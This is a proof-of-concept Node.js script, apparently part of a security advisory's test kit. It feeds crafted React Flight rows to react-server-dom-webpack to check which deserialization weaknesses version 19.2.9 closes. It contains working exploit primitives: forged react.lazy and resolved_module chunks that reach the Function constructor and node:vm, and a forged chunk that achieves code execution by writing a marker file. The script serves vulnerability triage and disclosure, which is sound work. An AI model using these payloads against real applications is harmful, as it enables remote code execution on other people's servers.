/**
 * Isolates the client-side primitives, independent of the transport bug.
 *
 * `run.mjs` proves the whole chain. This script instead hand-feeds crafted
 * Flight rows straight to `createFromReadableStream`, which answers a different
 * question: of the weaknesses the attacker chains together once they can inject
 * rows, which ones does 19.2.9 actually close? Useful when triaging another
 * route to row injection.
 *
 * Usage: node poc/primitives.mjs [--env env/vulnerable] [--prod]
 */
import {rm, readFile} from 'node:fs/promises';
import {fileURLToPath} from 'node:url';
import {dirname, join, resolve} from 'node:path';
import {tmpdir} from 'node:os';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const args = parseArgs(process.argv.slice(2));
const envs = args.env
  ? [resolve(args.env)]
  : [join(root, 'env/vulnerable'), join(root, 'env/patched')];

const MARKER = join(tmpdir(), 'ghsa-xqc2-primitive.json');
const LAZY = '$Sreact.lazy';

/**
 * Each case is a set of Flight rows plus what a successful outcome looks like.
 * The root row always puts the result under `probe` so it can be inspected.
 */
const CASES = [
  {
    name: 'property-path walk reaches the Function constructor',
    detail:
      'getOutlinedModel() walks `$<id>:a:b` through the deserialized value, so ' +
      'any object yields `.constructor.constructor`.',
    rows: ['a:{}'],
    rootRef: '$a:constructor:constructor',
    ok: r => typeof r.probe === 'function' && r.probe.name === 'Function',
    fixedIn1929: false,
  },
  {
    name: 'forged react.lazy node is accepted as an internal chunk',
    detail:
      "getOutlinedModel() unwraps any value whose $$typeof is Symbol.for('react.lazy') " +
      'by reading `_payload` and treating it as one of React\'s own chunk records.',
    rows: [
      `a:${JSON.stringify({
        $$typeof: LAZY,
        _payload: {status: 'fulfilled', value: 'unwrapped-a-forged-chunk', _debugChunk: null},
      })}`,
    ],
    rootRef: '$a',
    ok: r => r.probe === 'unwrapped-a-forged-chunk',
    fixedIn1929: false,
  },
  {
    name: 'forged resolved_module chunk bypasses the consumer manifest',
    detail:
      'initializeModuleChunk() calls requireModule(chunk.value) with the forged ' +
      "metadata, so resolveClientReference() and the response's moduleMap never " +
      'see it: one arbitrary __webpack_require__(id) plus one arbitrary export read.',
    rows: [
      `a:${JSON.stringify({
        $$typeof: LAZY,
        _payload: {
          status: 'resolved_module',
          value: ['node:vm', [], 'runInThisContext'],
          _debugChunk: null,
        },
      })}`,
    ],
    rootRef: '$a',
    ok: r => typeof r.probe === 'function' && r.probe.name === 'runInThisContext',
    fixedIn1929: false,
  },
  {
    name: 'forged resolved_model chunk supplies its own Response',
    detail:
      'initializeModelChunk() took the Response straight out of `chunk.reason`, ' +
      'so a forged chunk controls both the reviver (`response._fromJSON`) and the ' +
      'document it is applied to. Pointing it at a gadget is code execution.',
    rows: [
      `a:${JSON.stringify({
        $$typeof: LAZY,
        _payload: {
          status: 'resolved_module',
          value: ['node:vm', [], 'runInThisContext'],
          _debugChunk: null,
        },
      })}`,
      `b:${JSON.stringify({
        $$typeof: LAZY,
        _payload: {
          status: 'resolved_model',
          value: JSON.stringify({
            [`process.getBuiltinModule('node:fs').writeFileSync(${JSON.stringify(
              MARKER,
            )}, '{"executed":true}')`]: {},
          }),
          reason: {_fromJSON: '$a'},
          _debugChunk: null,
        },
      })}`,
    ],
    rootRef: '$b',
    ok: async () => {
      try {
        return JSON.parse(await readFile(MARKER, 'utf8')).executed === true;
      } catch {
        return false;
      }
    },
    fixedIn1929: true,
  },
  {
    name: 'a function can be parked on a `then` key',
    detail:
      'createModel() returned whatever it was given, so a deserialized object ' +
      'could be made thenable and hijack any await of it.',
    rows: ['a:{}'],
    rootRef: null,
    rootRow: '0:{"probe":{"then":"$a:constructor:constructor"}}',
    ok: r => typeof r.probe?.then === 'function',
    fixedIn1929: true,
  },
];

for (const env of envs) {
  const {ReactServerDOMClient, version} = await import(`${env}/load-client.mjs`);
  console.log(`\n${'='.repeat(78)}\nreact-server-dom-webpack ${version}  (${
    process.env.NODE_ENV ?? 'development'
  })\n${'='.repeat(78)}`);

  for (const testCase of CASES) {
    await rm(MARKER, {force: true});
    const rootRow = testCase.rootRow ?? `0:{"probe":${JSON.stringify(testCase.rootRef)}}`;
    const wire = testCase.rows.map(r => r + '\n').join('') + rootRow + '\n';

    let result = {};
    let error = null;
    try {
      result = await ReactServerDOMClient.createFromReadableStream(
        new ReadableStream({
          type: 'bytes',
          start(controller) {
            controller.enqueue(new Uint8Array(Buffer.from(wire, 'utf8')));
            controller.close();
          },
        }),
        {
          serverConsumerManifest: {
            moduleMap: {},
            moduleLoading: null,
            serverModuleMap: null,
          },
        },
      );
    } catch (e) {
      error = e;
    }

    const worked = error ? false : Boolean(await testCase.ok(result));
    const expected = version.startsWith('19.2.8') ? true : !testCase.fixedIn1929;
    const flag = worked === expected ? ' ' : '!';
    console.log(
      `\n${flag} [${worked ? 'WORKS ' : 'BLOCKED'}] ${testCase.name}`,
    );
    console.log(`    ${testCase.detail.replace(/(.{1,88})(\s|$)/g, '$1\n    ').trim()}`);
    if (error) console.log(`    threw: ${error.message.split('\n')[0]}`);
    if (worked !== expected) {
      console.log(`    UNEXPECTED: expected ${expected ? 'WORKS' : 'BLOCKED'}`);
    }
  }
}

await rm(MARKER, {force: true});
console.log();

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    if (!argv[i].startsWith('--')) continue;
    const key = argv[i].slice(2);
    if (argv[i + 1] && !argv[i + 1].startsWith('--')) out[key] = argv[++i];
    else out[key] = true;
  }
  return out;
}
